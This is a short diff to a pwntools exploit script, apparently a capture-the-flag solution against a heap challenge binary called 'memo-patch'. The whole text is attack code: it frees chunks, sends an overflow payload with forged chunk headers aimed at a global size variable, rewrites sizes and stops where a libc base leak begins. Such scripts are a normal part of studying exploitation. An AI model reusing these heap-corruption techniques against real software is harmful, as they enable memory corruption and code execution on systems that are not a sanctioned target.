@@ -9,7 +9,6 @@ report = 8888
 r = process('./memo-patch')
 #r = remote(reip, report)
 
-
 # Setup name & pw
 r.recvuntil("What's user name:")
 r.sendline('nae')
@@ -56,20 +55,16 @@ libc = ELF('bc.so.6')
 
 leave(0, 32, 'A'*8)
 leave(1, 32, 'B'*8)
-leave(2, 32, 'C'*8)
-leave(3, 32, 'D'*8)
 
 # Overflow
-delete(3)
+delete(1)
 delete(0)
 payload = ('A'*32 + p64(0) + p64(0x31) +
-        'A'*32 + p64(0) + p64(0x31) +
-        'A'*32 + p64(0) + p64(0x31) +
         p64(global_size-0x10))
 leave(0, 400, payload, True)
 leave(0, 32, 'A'*4)          # malloc garbage
 leave(3, 32, 'A'*7)          # Get the chunk in global
-fix_size_payload = '\x08'.ljust(4, '\x00') + '\x20'.ljust(4, '\x00')*2 + '\x00\x01\x00\x00'
+fix_size_payload = '\x20'.ljust(4, '\x00')*3 + '\x00\x01\x00\x00'
 edit(fix_size_payload)
 
 # Leak libc base
